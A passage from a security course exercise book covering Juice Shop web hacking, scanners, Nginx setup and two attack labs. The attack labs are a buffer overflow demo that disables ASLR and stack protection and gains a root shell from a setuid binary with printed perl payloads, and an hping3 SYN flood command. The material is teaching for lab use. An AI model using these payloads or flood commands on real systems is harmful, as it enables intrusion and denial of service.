  3.1.10, and 3.2.x before 3.2.11 are vulnerable. This script sends 3 harmless
  YAML payloads to detect vulnerable installations. If the malformed object
  receives a status 500 response, the server is processing YAML objects and
  therefore is likely vulnerable.

  References:
  * https://community.rapid7.com/community/metasploit/blog/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156',
  * https://groups.google.com/forum/?fromgroups=#!msg/rubyonrails-security/61bkgvnSGTQ/nehwjA8tQ8EJ',
  * http://cvedetails.com/cve/2013-0156/
\end{alltt}

Some scripts also require, or allow arguments into them:

\begin{alltt}
  nmap -sC --script-args 'user=foo,pass=",{}=bar",paths={/admin,/cgi-bin},xmpp-info.server_name=localhost'
\end{alltt}




\chapter{Run OWASP Juice Shop 45 min}
\label{ex:sw-startjuice}

\hlkimage{3cm}{JuiceShop_Logo_100px.png}

{\bf Objective:}\\
Lets try starting the OWASP Juice Shop

{\bf Purpose:}\\
We will be doing some web hacking where you will be the hacker. There
will be an application we try to hack, designed to
optimise your learning.

It is named JuiceShop which is written in JavaScript

{\bf Suggested method:}\\
Go to \link{https://github.com/bkimminich/juice-shop}

Read the instructions for running juice-shop - docker is a simple way.

What you need

You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}


{\bf Hints:}\\
The application is very modern, very similar to real applications.

The Burp proxy is an advanced tool! Dont be scared, we will use small parts at different times.

JuiceShop can be run as a docker, and sometimes running it on Kali is the easiest learning environment.

{\bf Solution:}\\
When you have a running Juice Shop web application in your team, then we are good.

{\bf Discussion:}\\
It has lots of security problems which can be used for learning
hacking, and thereby how to secure your applications. It is  related
to the OWASP.org Open Web Application Security Project which also has a
lot of resources.

Sources:\\
\url{https://github.com/bkimminich/juice-shop}\\
\url{https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project}

It is recommended to buy the \emph{Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop} from \link{https://leanpub.com/juice-shop} - suggested price USD 5.99



\chapter{Setup JuiceShop environment, app and proxy - up to 60min}
\label{ex:js-burp}

{\bf Objective:}\\
Run JuiceShop with Burp proxy.

Start JuiceShop and make sure it works, visit using browser.

Then add a web proxy in-between. We will use Burp suite which is a commercial product, in the community edition.

{\bf Purpose:}\\
We will learn more about web applications as they are a huge part of the applications used in enterprises and on the internet. Most mobile apps are also web applications in disguise.

By inserting a web proxy we can inspect the data being sent between browsers and the application.

{\bf Suggested method:}\\
You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version \emph{plain JAR file} from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}

follow the Getting Started instructions at:\\
\link{https://support.portswigger.net/customer/portal/articles/1816883-getting-started-with-burp-suite}


{\bf Hints:}\\
Recommend running Burp on the default address and port 127.0.0.1 port 8080.

Note: Burp by default has \verb+intercept is on+ in the Proxy tab, press the button to allow data to flow.

\hlkimage{10cm}{burp-default-proxy-intercept.png}

Then setting it as proxy in Firefox:

\hlkimage{10cm}{firefox-connection-burp.png}

After setting up proxy, you can visit \url{http://burp} and get a CA certificate that can be installed, making it easier to run against HTTPS sites.

The newest versions of Burp include a browser, making it much easier to run the tasks, pre-configured with proxy.

{\bf Solution:}\\
When web sites and servers start popping up in the Target tab, showing the requests and responses - you are done.

Your browser will alert you when visiting TLS enabled sites, HTTPS certificates do not match, as Burp is doing a person-in-the-middle. You need to select advanced and allow this to continue.

{\bf Discussion:}\\
Since Burp is often updated I use a small script for starting Burp which I save in \verb+~/bin/burp+ - dont forget to add to PATH and \verb+chmod +x bin/burp+.

\begin{alltt}
#! /bin/sh
DIRNAME=`dirname $0`
BURP=`ls -1tra $DIRNAME/burp*.jar | tail -1`
java -jar -Xmx6g $BURP &
\end{alltt}

When running in production testing real sites, I typically increase the memory available using JDK / Java settings like \verb+-Xmx16g+



\chapter{JuiceShop Attacks 60min}
\label{ex:juiceshop-attack}

\hlkimage{2cm}{JuiceShop_Logo_100px.png}

 {\bf Objective:}\\
Hack a web application!

Try a few attacks in the JuiceShop with web proxy

\begin{quote}
The OWASP Juice Shop is a pure web application implemented in JavaScript. In the
frontend the popular AngularJS framework is used to create a so-called Single Page
Application. The user interface layout is provided by Twitter's Bootstrap framework - which
works nicely in combination with AngularJS.
JavaScript is also used in the backend as the exclusive programming language: An Express
application hosted in a Node.js server delivers the client-side code to the browser. It also
provides the necessary backend functionality to the client via a RESTful API.

...

The vulnerabilities found in the OWASP Juice Shop are categorized into several different
classes. Most of them cover different risk or vulnerability types from well-known lists or
documents, such as OWASP Top 10 or MITRE's Common Weakness Enumeration. The
following table presents a mapping of the Juice Shop's categories to OWASP and CWE
(without claiming to be complete).
\end{quote}

\hlkimage{10cm}{juiceshop-mappings.png}
Source: \emph{Pwning OWASP Juice Shop}


 {\bf Purpose:}\\
 Try out some of the described web application flaws in a controlled environment. See how an attacker would be able to gather information and attack through HTTP, browser and proxies.

 {\bf Suggested method:}\\
Start the web application, start Burp or another proxy - start your browser.

Access the web application through your browser and get a feel for how it works. First step is to register your user, before you can shop.

Dont forget to use web developer tools like the JavaScript console!

Then afterwards find and try to exploit vulnerabilities, using the book from Björn and starting with some easy ones:

Suggested list of starting vulns:
\begin{list2}
\item Admin Section Access the Admin Section
\item Error handling Provoke and error
\item Forged Feedback Post some feedback in another users name.
\item Access a confidential document
\item Forgotten Sales Backup Access a salesman's forgotten backup file.
\item Retrieve a list of all user credentials via SQL Injection
\end{list2}


 {\bf Hints:}\\
 The complete guide \emph{Pwning OWASP Juice Shop}
written by Björn Kimminich is available as PDF which you can buy, or you can read it online at:\\
\url{https://pwning.owasp-juice.shop/}


 {\bf Solution:}\\
 You decide for how long you want to play with JuiceShop.

 Do know that some attackers on the internet spend all their time researching, exploiting and abusing web applications.

 {\bf Discussion:}\\
The vulnerabilities contained in systems like JuiceShop mimic real ones, and do a very good job. You might not think this is possible in real applications, but there is evidence to the contrary.

Using an app like JS instead of real applications with flaws allow you to spend less on installing apps, and more on exploiting.





\chapter{Demo: Buffer Overflow 101 - 30-40min}
\label{ex:bufferoverflow}


{\bf Objective:}\\
Run a demo program with invalid input - too long.

{\bf Purpose:}\\
See how easy it is to cause an exception.

{\bf Suggested method:}\\
Instructor will walk through this!

{\Large This exercise is meant to show how binary exploitation is done at a low level. If this is the first time you ever meet this, don't worry about it. You need to know this can happen, but you are not expected to be able to explain details during the exam!}

Running on a modern Linux has a lot of protection, making it hard to exploit. Using a Raspberry Pi instead makes it quite easy. Choose what you have available.

Using another processor architecture like MIPS or ARM creates other problems.

\begin{list2}
\item Small demo program \verb+demo.c+
\item Has built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.

Use GDB to repeat the demo by the instructor.

{\bf Hints:}\\
First make sure it compiles:
\begin{alltt}
\$ gcc -o demo demo.c
\$ ./demo hejsa
hejsa
\end{alltt}

Make sure you have tools installed:
\begin{alltt}
apt-get install gdb
\end{alltt}

Then run with debugger:

\begin{alltt}
\$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) {\bf
(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)
// OR
(gdb) {\bf
(gdb) run $(perl -e "print 'A'x22; print 'B'; print 'C'")}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)

\end{alltt}

Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.

{\bf Solution:}\\
When you can run the program with debugger as shown, you are done.

{\bf Discussion:}\\

the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
\begin{alltt}\footnotesize
\$ nm demo
0000000000201040 B __bss_start
0000000000201040 b completed.6972
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201030 D __data_start
0000000000201030 W data_start
0000000000000640 t deregister_tm_clones
00000000000006d0 t __do_global_dtors_aux
0000000000200de0 t __do_global_dtors_aux_fini_array_entry
0000000000201038 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201040 D _edata
0000000000201048 B _end
0000000000000804 T _fini
0000000000000710 t frame_dummy
0000000000200dd8 t __frame_dummy_init_array_entry
0000000000000988 r __FRAME_END__
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
000000000000081c r __GNU_EH_FRAME_HDR
00000000000005a0 T _init
0000000000200de0 t __init_array_end
0000000000200dd8 t __init_array_start
0000000000000810 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000200de8 d __JCR_END__
0000000000200de8 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000000800 T __libc_csu_fini
0000000000000790 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000000740 T main
                 U puts@@GLIBC_2.2.5
0000000000000680 t register_tm_clones
0000000000000610 T _start
                 U strcpy@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
000000000000077c T the_shell
0000000000201040 D __TMC_END__
\end{alltt}

The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.

We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
\begin{alltt}
sudo apt-get install gcc-multilib
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
\end{alltt}

Then you can produce 32-bit executables:
\begin{alltt}\footnotesize
// Before:
user@debian-9-lab:~/demo$ file demo
demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
// After - 32-bit
user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
user@debian-9-lab:~/demo$ file demo
demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
\end{alltt}

And layout:
\begin{alltt}\footnotesize
0804a024 B __bss_start
0804a024 b completed.6587
0804a01c D __data_start
0804a01c W data_start
...
080484c0 T the_shell
0804a024 D __TMC_END__
080484eb T __x86.get_pc_thunk.ax
080483a0 T __x86.get_pc_thunk.bx
\end{alltt}


Successful execution would look like this - from a Raspberry Pi:
\begin{alltt}\footnotesize
\$ gcc -o demo demo.c
\$ nm demo | grep the_shell
000104ec T the_shell
\$

...
(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
AAAAAAAAAAAAAAAA
\$
\end{alltt}

Started a new shell.

you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
\begin{alltt}\footnotesize
pi@raspberrypi:~/demo $ gcc -o demo demo.c
pi@raspberrypi:~/demo $ sudo chown root.root demo
pi@raspberrypi:~/demo $ sudo chmod +s demo
pi@raspberrypi:~/demo $ id
uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
AAAAAAAAAAAAAAAA
# id
uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
#

\end{alltt}


\chapter{SSL/TLS scanners 15 min}
\label{ex:sslscan}

{\bf Objective:}\\
Try the Online Qualys SSLLabs scanner \link{https://www.ssllabs.com/}
Try the command line tool sslscan checking servers - can check both HTTPS and non-HTTPS protocols!

{\bf Purpose:}\\
Learn how to efficiently check TLS settings on remote services.

{\bf Suggested method:}\\
Run the tool against a couple of sites of your choice.

\begin{alltt}\small
root@kali:~# sslscan --ssl2 web.kramse.dk
Version: 1.10.5-static
OpenSSL 1.0.2e-dev xx XXX xxxx

Testing SSL server web.kramse.dk on port 443
...
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.kramse.dk
Altnames: DNS:*.kramse.dk, DNS:kramse.dk
Issuer:   AlphaSSL CA - SHA256 - G2
\end{alltt}

Also run it without \verb+--ssl2+ and against SMTPTLS if possible.

{\bf Hints:}\\
Originally sslscan is from \link{http://www.titania.co.uk} but use the version on Kali, install with apt if not installed.

{\bf Solution:}\\
When you can run and understand what the tool does, you are done.

{\bf Discussion:}\\
SSLscan can check your own sites, while Qualys SSLLabs only can test from hostname



\chapter{Internet scanners 15 min}
\label{ex:web-site-check}

{\bf Objective:}\\
Try the Online scanners \link{https://internet.nl/} and a few more.

{\bf Purpose:}\\
Learn how to efficiently check settings on remote services.

{\bf Suggested method:}\\
There are multiple portals and testing services which allow you to checck a domain,
mail settings or web site.

Run tools against a couple of sites of your choice.
\begin{itemize}
\item \url{https://internet.nl/} Generic checker
\item \url{https://www.hardenize.com/} Generic checker
\item \url{https://www.wormly.com/test_ssl} Test TLS
\item \url{https://observatory.mozilla.org/} Web site headers check
\item \url{https://dnsviz.net/} DNS zone check
\item \url{https://rpki.cloudflare.com/} Check RPKI - route validator enter
IP address\\
More information about this: \url{https://labs.ripe.net/author/nathalie_nathalie/rpki-test/}
\end{itemize}

Others exist, feel free to suggest some.

{\bf Hints:}\\

{\bf Solution:}\\
When you can run and understand what at least one tool does, you are done.

{\bf Discussion:}\\
Which settings are most important, which settings are your responsebility?



\chapter{Real Vulnerabilities up to 30min}
\label{ex:real-vulns-exim}

{\bf Objective:}\\
Look at real vulnerabilities. Choose a few real vulnerabilities, prioritize them.

{\bf Purpose:}\\
See that the error types described in the books - are still causing problems.

{\bf Suggested method:}\\
We will use the 2019 Exim errors as starting examples. Download the descriptions from:
\begin{list2}
\item Exim RCE CVE-2019-10149 June\\ \url{https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt}

\item Exim RCE CVE-2019-15846 September\\
\url{https://exim.org/static/doc/security/CVE-2019-15846.txt}
\end{list2}

When done with these think about your own dependencies. What software do you depend on? How many vulnerabilities and CVEs are for that? Each year has huge new vulnerabilities, like the 2020 and 2021 shown above.

\begin{list2}
\item CVE-2020 Netlogon Elevation of Privilege \\
\link{https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472}
\item Log4J RCE (CVE-2021-44228) - and follow up like CVE-2021-45046, also look at scanners like:\\
\link{https://github.com/fullhunt/log4j-scan}
\end{list2}

What is CVSS -- Common Vulnerability Scoring System?

I depend on the OpenBSD operating system, and it has flaws too:\\
\url{https://www.openbsd.org/errata65.html}

You may depend on OpenSSH from the OpenBSD project, which has had a few problems too:\\
\url{https://www.openssh.com/security.html}

{\bf Hints:}\\
Remote Code Execution can be caused by various things, but most often some kind of input validation failure.

{\bf Solution:}\\
When you have identified the specific error type, is it buffer overflows? Then you are done.

{\bf Discussion:}\\
How do you feel about running internet services. Lets discuss how we can handle running insecure code.
What other methods can we use to restrict problems caused by similar vulnerabilities.
A new product will often use a generic small computer and framework with security problems.




\chapter{Nikto Web Scanner 15 min}
\label{ex:nikto-webscanner}

{\bf Objective:}\\
Try the program Nikto locally on your workstation


{\bf Purpose:}\\
Running Nikto will allow you to analyse web servers quickly.

\hlkimage{2cm}{nikto.jpg}

\begin{quote}
{\bf Description}
Nikto is an Open Source (GPL) web server scanner which performs
comprehensive tests against web servers for multiple items, including
over 3200 potentially dangerous files/CGIs, versions on over 625
servers, and version specific problems on over 230 servers. Scan items
and plugins are frequently updated and can be automatically updated
(if desired).
\end{quote}

Source: Nikto web server scanner \link{http://cirt.net/nikto2}


\begin{list1}
\item Easy to run, free and quickly reports on static URLs resulting in a interesting response
\item \verb+nikto -host 127.0.0.1 -port 8080+
\item When run with port 443 will check TLS sites
\end{list1}



{\bf Suggested method:}\\
Run the program from your Kali Linux VM

\begin{alltt}
\footnotesize
Script started on Tue Nov  7 17:43:54 2006
$  nikto -host 127.0.0.1 -port 8080 ^M
---------------------------------------------------------------------------
- Nikto 1.35/1.34     -     www.cirt.net
+ Target IP:       127.0.0.1
+ Target Hostname: localhost.pentest.dk
+ Target Port:     8080
+ Start Time:      Tue Nov  7 17:43:59 2006
...
+ /examples/ - Directory indexing enabled, also default JSP examples. (GET)
+ /examples/jsp/snp/snoop.jsp - Displays information about page
retrievals, including other users. (GET)
+ /examples/servlets/index.html - Apache Tomcat default JSP pages
present. (GET)
\end{alltt}
%$

{\bf Hints:}\\
Nikto can find things like a debug.log, example files, cgi-bin directories etc.

If the tool is not available first try: \verb+apt-get install nikto+

Some tools will need to be checked out from Git and run or installed from source.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

{\bf Discussion:}\\


\chapter{Whatweb Scanner 15 min}
\label{ex:whatweb-scanner}

{\bf Objective:}\\
Try the program Whatweb locally on your workstation


{\bf Purpose:}\\
Running Whatweb will allow you to analyse which technologies are used in a web site.

I usually save the command and the common options as a small script:
\begin{alltt}
#! /bin/sh

whatweb -v -a 3 $*
\end{alltt}


{\bf Suggested method:}\\
Run the program from your Kali Linux VM towards a site of you own choice.

\begin{alltt}
user@KaliVM:~$ whatweb -a 3 www.zencurity.com
http://www.zencurity.com [301 Moved Permanently] HTTPServer[nginx], IP[185.129.60.130], RedirectLocation[https://www.zencurity.com/], Title[301 Moved Permanently], nginx
https://www.zencurity.com/ [200 OK] Email[hlk@zencurity.dk], HTML5, HTTPServer[nginx], IP[185.129.60.130], Title[Home Page], X-UA-Compatible[IE=edge], nginx
\end{alltt}


{\bf Hints:}\\
If the tool is not available first try: \verb+apt-get install *thetool*+

Some tools will need to be checked out from Git and run or installed from source.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

{\bf Discussion:}\\
How does this tool work?

It tries to fetch common files left or used by specific technologies.



\chapter{Apache Benchmark 20 min}
\label{ex:apache-benchmark}

{\bf Objective:}\\
Try the program Apache Benchmark locally on your workstation


{\bf Purpose:}\\
Running this benchmark will allow you to analyse your webserver, perform testing and get data about performance.

On Debian this tool is in the package: \verb+apache2-utils+ (hint:  \verb+apt install apache2-utils+)

\begin{alltt}\footnotesize
\$
ab -n 100 https://www.kramse.org/
This is ApacheBench, Version 2.3 <$Revision: 1879490 $>
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking www.kramse.org (be patient).....done


Server Software:        nginx
Server Hostname:        www.kramse.org
Server Port:            443
SSL/TLS Protocol:       TLSv1.2,ECDHE-RSA-AES256-GCM-SHA384,4096,256
Server Temp Key:        ECDH P-384 384 bits
TLS Server Name:        www.kramse.org

Document Path:          /
Document Length:        5954 bytes

Concurrency Level:      1
Time taken for tests:   9.596 seconds
Complete requests:      100
Failed requests:        0
Total transferred:      651100 bytes
HTML transferred:       595400 bytes
Requests per second:    10.42 [#/sec] (mean)
Time per request:       95.962 [ms] (mean)
Time per request:       95.962 [ms] (mean, across all concurrent requests)
Transfer rate:          66.26 [Kbytes/sec] received

Connection Times (ms)
              min  mean[+/-sd] median   max
Connect:       48   71 105.5     61    1114
Processing:     6   25 157.8      9    1587
Waiting:        5    9   1.9      9      16
Total:         55   96 189.0     70    1649

Percentage of the requests served within a certain time (ms)
  50%     70
  66%     72
  75%     73
  80%     74
  90%     76
  95%     78
  98%   1124
  99%   1649
 100%   1649 (longest request)
\end{alltt}


{\bf Suggested method:}\\
Run the program from your Debian or Kali Linux VM


{\bf Hints:}\\
Some tools will need to be checked out from Git and run or installed from source.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

{\bf Discussion:}\\
Apache benchmark is very simple, more advanced tools can perform more advanced testing, following a login flow, ordering something, completing a purchase etc.


\chapter{Bonus:TCP SYN flooding 30min}
\label{ex:syn-flood}

{\bf Objective:}\\
Start a webserver attack using SYN flooding tool hping3.

{\bf Purpose:}\\
See how easy it is to produce packets on a network using hacker programs.

The tool we will use is very flexible and can produce ICMP, UDP and TCP using very few options. This tool is my primary one for doing professsional DDoS testing.

\begin{alltt}\footnotesize
-1 --icmp
       ICMP  mode,  by  default  hping3  will  send  ICMP echo-request, you can set other ICMP
       type/code using --icmptype --icmpcode options.

-2 --udp
       UDP mode, by default hping3 will send udp to target host's port 0.  UDP header  tunable
       options are the following: --baseport, --destport, --keep.
\end{alltt}

TCP mode is default, so no option needed.


{\bf Suggested method:}\\
Connect to the LAB network using Ethernet! Borrow a USB network card if you dont have one.

Start your Kali VM in bridged mode, try a basic TCP flooding attack against the server provided by the instructor, or your own Debian server.

Try doing the most common attacks TCP SYN flood using hping3:

\begin{alltt}
hping3 --flood -p 80 -S 10.0.45.12
\end{alltt}

You should see something like this:
\begin{alltt}\footnotesize
HPING 10.0.45.12: NO FLAGS are set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
^C
--- 10.0.45.12 hping statistic ---
352339 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
\end{alltt}

You can try different ports with TCP flooding, try port 22/tcp or HTTP(S) port 80/tcp and 443/tcp


{\bf Hints:}\\
The tool we use can do a lot of different things, and you can control the speed. You can measure at the server being attacked or what you are sending, commonly using ifpps or such programs can help.

By changing the speed we can find out how much traffic is needed to bring down a service. This measurement can then be re-checked later and see if improvements really worked.

This allows you to use the tool to test devices and find the breaking point, which is more interesting than if you can overload, because you always can.
\begin{alltt}\footnotesize
-i --interval
       Wait  the  specified  number  of  seconds or micro seconds between sending each packet.
       --interval X set wait to X seconds, --interval uX set wait to X micro seconds.  The de‐
       fault  is  to  wait one second between each packet. Using hping3 to transfer files tune
       this option is really important in order to increase transfer rate. Even  using  hping3
       to  perform  idle/spoofing  scanning  you should tune this option, see HPING3-HOWTO for
       more information.

--fast Alias for -i u10000. Hping will send 10 packets for second.

--faster
       Alias for -i u1. Faster then --fast ;) (but not as fast as your computer can send pack‐
       ets due to the signal-driven design).

--flood
       Sent  packets  as fast as possible, without taking care to show incoming replies.  This
       is ways faster than to specify the -i u0 option.
\end{alltt}

{\bf Solution:}\\
When your team has sent +1 million packets per second into the network, from one or two laptops - you are done.

{\bf Discussion:}\\
Gigabit Ethernet can send up to 1.4 million packets per second, pps.

There is a presentation about DDoS protection with low level technical measures to implement at\\
{\footnotesize \link{https://github.com/kramse/security-courses/tree/master/presentations/network/introduction-ddos-testing}}

Receiving systems, and those en route to the service, should be checked for resources like CPU load, bandwidth, logging. Logging can also overload the logging infrastructure, so take care when configuring this in your own networks.





\chapter{Nginx as a Transport Layer Security (TLS) endpoint 20 min}
\label{ex:nginx-tls}

{\bf Objective:}\\
Try configuring Nginx with TLS locally on your workstation


{\bf Purpose:}\\
Web services with TLS is a requirement in many circumstances. Unfortunately having TLS enabled requires both certificates, settings and large software packages like OpenSSL. A lot of vulnerabilities have been found in these and updating them may prove hard.

Having a centralized entry where TLS is served to the internet may help you.

{\bf Suggested method:}\\
Run the programs from your Debian Linux VM, use \verb+apt install nginx+ if not already installed.

Follow a guide like the one from Nginx:\\
\url{http://nginx.org/en/docs/http/configuring_https_servers.html}

Check using sslscan if your site is working, and configured according to best current practice.

{\bf Hints:}\\
Note: above link does NOT show how to generate certificates and keys, so you need to find this yourself. A good place would be at certificate providers, search for Nginx CSR Certificate Signing Request -- just dont order certificates.

A full blown tutorial from Digital Ocean:\\
\link{https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-on-debian-10}

My kramse-labs also includes some example configs, check with \verb+git pull+

{\bf Solution:}\\
When you have configured an instance of Nginx you are done.

{\bf Discussion:}\\
A great document about Transport Layer Security (TLS) is available from the web site of NCSC in the Netherlands:\\
{\scriptsize\url{https://english.ncsc.nl/publications/publications/2021/january/19/it-security-guidelines-for-transport-layer-security-2.1}}

Dont forget to add the recommended HTTP Strict Transport Security header to your configuration, if your site is in production.

{\footnotesize\url{https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html}}

A regular production site could also benefit from Lets Encrypt certificates updated automatically using one of the many clients available. Try searching for Lets Encrypt and Nginx.

\chapter{Run Nginx as a load balancer}
\label{ex:nginx-loadbalancer}


{\bf Objective:}\\
Run Nginx in a load balancing configuration.

{\bf Purpose:}\\
See an example load balancing tool used for many integration projects, Nginx

{\bf Suggested method:}\\
Running Nginx as a load balancer does not require a lot of configuration.

First goal: Make Nginx listen on two ports by changing the default configuration.

\begin{list2}
\item Start by installing Nginx in your Debian, see it works - open localhost port 80 in browser\\
\verb+apt install nginx+
\item Copy the configuration file! Keep this backup,\\
\verb+cd /etc/nginx/;cp nginx.conf nginx.conf.orig+
\item Add / copy the section for the port 80 server, see below
\item Change \emph{sites} to use port 81 and port 82
\end{list2}


Creating a new site, based on the default site found on Nginx in Debian:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:/etc/nginx# cd /etc/nginx/sites-enabled/
root@debian-lab:/etc/nginx/sites-enabled# cp default default2
root@debian-lab:/etc/nginx/sites-enabled# cd /var/www/
root@debian-lab:/var/www# cp -r html html2
\end{minted}

Then edit files \verb+default+ to use port 81/tcp and \verb+default2+ to use port 82/tcp

- also make sure \verb+default2+ uses \verb+root /var/www/html2+

Configuration changes made.

These are the changes you should make:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:/etc/nginx/sites-enabled# diff default default2
22,23c22,23
< 	listen 81 default_server;
< 	listen [::]:81 default_server;
---
> 	listen 82 default_server;
> 	listen [::]:82 default_server;
41c41
< 	root /var/www/html;
---
> 	root /var/www/html2;
\end{minted}



Config test and restart of Nginx can be done using stop and start commands:

\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:/var/www# nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
root@debian-lab:/var/www# service nginx stop
root@debian-lab:/var/www# service nginx start
\end{minted}

You can now visit \url{http://127.0.0.1:81} and \url{http://127.0.0.1:82}\\
 - which show the same text, but you can change the files in \\
 \verb+/var/www/html+ and \verb+/var/www/html2+

NOTE: also verify that port 80 does \emph{not work} anymore!

Adding the loadbalancer in nginx.conf.

We can now add the two \emph{servers} running into a single loadbalancer with a little configuration:

Add this into \verb+/etc/nginx/nginx.conf+ - inside the section \verb+http { ... }+
\begin{minted}[fontsize=\footnotesize]{shell}
upstream myapp1 {
        server localhost:81;
        server localhost:82;
}
server {
        listen 80;
        location / {
                proxy_pass http://myapp1;
        }
}
\end{minted}

And test using \url{http://127.0.0.1:80}



{\bf Hints:}\\
Make changes to the two sets of HTML files

\begin{minted}[fontsize=\footnotesize]{shell}
root@debian-lab:~# cd /var/www/
root@debian-lab:/var/www# diff html
html/  html2/
root@debian-lab:/var/www# diff html/index.nginx-debian.html html2/index.nginx-debian.html
4c4
< <title>Welcome to nginx!</title>
---
> <title>Welcome to nginx2!</title>
14c14
< <h1>Welcome to nginx!</h1>
---
> <h1>Welcome to nginx2!</h1>
\end{minted}

When reloading the page a few times it will switch between the two versions

My kramse-labs also includes some example configs, check with \verb+git pull+

{\bf Solution:}\\
When you have Nginx running load balanced, then we are good.

{\bf Discussion:}\\
Nginx is also common in cloud environments.

\chapter{Nginx logging  20 min}
\label{ex:nginx-logging}

{\bf Objective:}\\
See the common log format used by web servers.

\url{https://en.wikipedia.org/wiki/Common_Log_Format}


{\bf Purpose:}\\
Knowing that a common format exist, allow you to choose between multiple log processors.


{\bf Suggested method:}\\
Run Nginx on your Debian Linux VM and then check the logs.


\begin{alltt}
# cd /var/log/nginx
# ls
# less access.log
# less error.log
\end{alltt}


Produce some bad logs using Nikto or using a browser, and check \verb+error.log+


{\bf Hints:}\\
A lot of scanning acctivities would result in error logs, so if you observe a rise in 404 not found or similar, then maybe you are being targetted.

{\bf Solution:}\\
When you have tried the tool and seen some data you are done.

